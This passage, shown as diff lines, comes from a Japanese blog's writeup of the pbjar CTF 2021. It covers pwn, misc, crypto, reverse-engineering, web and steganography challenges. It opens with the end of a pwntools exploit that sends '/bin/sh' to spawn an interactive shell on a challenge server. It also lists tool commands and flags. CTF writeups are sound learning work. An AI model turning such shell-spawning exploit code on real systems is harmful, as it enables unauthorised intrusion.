+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Alright, one last input:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">);</span>
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>Flag: <code>flag{w1th_just_s0m3_str1ngz_1_b3c4m3_4_g0d_4t_r3d1r3ct10n}</code></p>
+<p><br /><br />
+ちなみに、説明文の中にも以下の注意書きが出てくるんですが、</p>
+<p><code>To use it, make sure you set the pwntools context arch correctly.</code></p>
+<p><br /></p>
+<p>最初に自分が書いたコードで arch の設定（ハイライト部分）をしていなかったばっかりに、以下のようなエラーが出て相当悩みました。。</p>
+<pre>
+    raise ValueError("pack(): number does not fit within word_size [%i, %r, %r]" % (0, number, limit))
+ValueError: pack(): number does not fit within word_size [0, 139917139504720, 4294967296]
+</pre>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-discord-plz-1-point">[Misc]: discord plz (1 point)</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_misc1.png" alt="pbjar_CTF_2021_misc1.png">
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>Discordに入れば見つかるやつ。</p>
+<p><br /></p>
+<p>Flag: <code>flag{thamks_for_joining_the_disc}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-miner">[Misc]: miner</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_misc2.png" alt="pbjar_CTF_2021_misc2.png">
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p><code>11834380</code> <code>Ethereum</code> でググったら以下が見つかりました。<br />
+<a href="https://cn.etherscan.com/block/11834380">https://cn.etherscan.com/block/11834380</a></p>
+<p><br /></p>
+<p>Flag: <code>flag{0xd224ca0c819e8e97ba0136b3b95ceff503b79f53}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-readflag1">[Misc]: readFlag1</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_misc3.png" alt="pbjar_CTF_2021_misc3.png">
+<p><br /></p>
+<h3 id="solution-5">Solution</h3>
+<p>ropsten の中でいろいろクリックしてたら見つかりました。（以下）<br />
+<a href="https://ropsten.etherscan.io/address/0xf0674cd7d1c0c616063a786e7d1434340e09badd#code">https://ropsten.etherscan.io/address/0xf0674cd7d1c0c616063a786e7d1434340e09badd#code</a></p>
+<p><br /></p>
+<p>Flag: <code>flag{etherscan_S0urc3_c0de}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-readflag2">[Misc]: readFlag2</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_misc4.png" alt="pbjar_CTF_2021_misc4.png">
+<p><br /></p>
+<h3 id="solution-6">Solution</h3>
+<p>チャレンジ文の中で <code>Previous one</code> と言われている contract は、0xa50cc4d707d8874e2494148ec2bab6138977838783ea200a45a8269384faaed4 です。</p>
+<p>ropsten の中でいろいろクリックしてたら見つかりました。（以下）<br />
+<a href="https://ropsten.etherscan.io/tx/0xa50cc4d707d8874e2494148ec2bab6138977838783ea200a45a8269384faaed4">https://ropsten.etherscan.io/tx/0xa50cc4d707d8874e2494148ec2bab6138977838783ea200a45a8269384faaed4</a></p>
+<p>Input dataをutf-8にしたら出てきます。</p>
+<p><br /></p>
+<p>Flag: <code>flag{web3js_plus_ABI_equalls_flag}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="crypto-convert">[Crypto]: Convert</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_crypto1.png" alt="pbjar_CTF_2021_crypto1.png">
+<p><br /></p>
+<h3 id="solution-7">Solution</h3>
+<p>666c61677b6469735f69735f615f666c346767675f68317d を文字にするだけです。</p>
+<p><br /></p>
+<p>Flag: <code>flag{dis_is_a_fl4ggg_h1}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="crypto-reallynotsecurealgorithm">[Crypto]: ReallynotSecureAlgorithm</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_crypto2.png" alt="pbjar_CTF_2021_crypto2.png">
+<p><br /></p>
+<h3 id="solution-8">Solution</h3>
+<p>RsaCtfTool.py で解けます。</p>
+<p><br /></p>
+<p>Flag: <code>flag{n0t_to0_h4rd_rIt3_19290453}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="rev-polymer">[Rev]: polymer</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_rev1.png" alt="pbjar_CTF_2021_rev1.png">
+<p><br /></p>
+<h3 id="solution-9">Solution</h3>
+<p>strings を実行すると、Fake フラグが大量に表示されます。</p>
+<p>かと言って、grep -v で除外してしまうと行単位で消えちゃうので正解のフラグも除外されてしまう、というチャレンジです。</p>
+<p>sedを使って除外しました。</p>
+<pre>
+$ strings polymer | grep -v "flag{n0t_th3_fl4g_l0l}"
+$ 
+$ strings polymer | sed -e 's/flag{n0t_th3_fl4g_l0l}//g' | grep flag
+mr.   i'll ask you what the real flag is flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921} think we'd all like to know.
+</pre>
+<p><br /></p>
+<p>Flag: <code>flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-corl">[Web]: cOrL</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_web1.png" alt="pbjar_CTF_2021_web1.png">
+<p><br /></p>
+<h3 id="solution-10">Solution</h3>
+<p>admin / admin でログインしようとすると、以下のメッセージが表示されます。</p>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_web1a.png" alt="pbjar_CTF_2021_web1a.png">
+<p>よくよく見ると、<code>put</code>の部分がBoldになっています。</p>
+<p>HTTP メソッド PUT を使うとフラグが得られます。</p>
+<p><br /></p>
+<p>Flag: <code>flag{HTTP_r3qu35t_m3th0d5_ftw}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-hack-nasa-with-html-mr-inspector-sherlock">[Web]: Hack NASA With HTML Mr. Inspector Sherlock</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_web2.png" alt="pbjar_CTF_2021_web2.png">
+<p><br /></p>
+<h3 id="solution-11">Solution</h3>
+<p>とりあえず、<code>wget -r</code> でまとめてダウンロードしてきて、ローカルで grep したり ブラウザで開いたりしてフラグを見つけました。</p>
+<p>3つに分かれています。</p>
+<p><br /></p>
+<p>animate.js:</p>
+<pre>
+dynamicanimAttr = "dynamicanimation flag{wA1t_a_m1nUt3_"
+</pre>
+<p><br /></p>
+<p>what.html:</p>
+<pre>
+What Is This? Flag part 2: I_th0ugh1_sh3l0ck_w2s
+</pre>
+<p><br />
+index.html:</p>
+<pre>
+Flag part 3: _a_d3t3ct1iv3????!?!?!}
+</pre>
+<p><br /></p>
+<p>Flag: <code>flag{wA1t_a_m1nUt3_I_th0ugh1_sh3l0ck_w2s_a_d3t3ct1iv3????!?!?!}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-stegosaurus-stenops">[Forensics]: Stegosaurus stenops</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_forensic1.png" alt="pbjar_CTF_2021_forensic1.png">
+<p><br /></p>
+<h3 id="solution-12">Solution</h3>
+<p><a href="https://github.com/RickdeJager/StegSeek">StegSeek</a> でフラグが得られます。</p>
+<p><br /></p>
+<p>Flag: <code>flag{ungulatus_better_than_stenops}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-wirf-die-gläser-an-die-wand">[Forensics]: Wirf die Gläser an die Wand</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_forensic2.png" alt="pbjar_CTF_2021_forensic2.png">
+<p><br /></p>
+<h3 id="solution-13">Solution</h3>
+<p>一時期、日本でも大ブームとなった<a href="https://www.youtube.com/watch?v=Fmyy1Km-cTE">モスカウ</a>の歌詞ですね。懐かしい！</p>
+<pre>
+Fremd und geheimnisvoll	   	 	      	       	      	     	     
+Türme aus rotem Gold	      	  	     	  	  	     	  
+Kalt wie das Eis    	   	   	   	     	  	 
+Moskau	      	 	     	       	      	      	   	       	    
+Doch wer dich wirklich kennt  	     	       	   	      	 
+Der weiß, ein Feuer brennt	   	  	  	  		
+In dir so heiß	     	   	     		     			       
+Kosaken hey hey hey hebt die Gläser (hey, hey)    	   		
+Natascha ha ha ha du bist schön (ha ha)	      	  	    	       
+Towarisch hey hey hey auf das Leben (hey, hey)      		
+Auf dein Wohl Bruder hey Bruder (hey, hey, hey, hey)
+:
+(snip)
+</pre>
+<p><br />
+空白文字が各行の後ろにあるので、stegsnow です。キーワードは曲のタイトル「Moskau」で一発で当たりでした。</p>
+<pre>
+$ stegsnow -C -p "Moskau" message.txt ; echo
+flag{du_bist_ein_echter_Russe}
+</pre>
+<p><br /></p>
+<p>Flag: <code>flag{du_bist_ein_echter_Russe}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-09-20
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/grabcon_ctf_2021/">
+            <span class="next-text nav-default">GrabCON CTF 2021 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
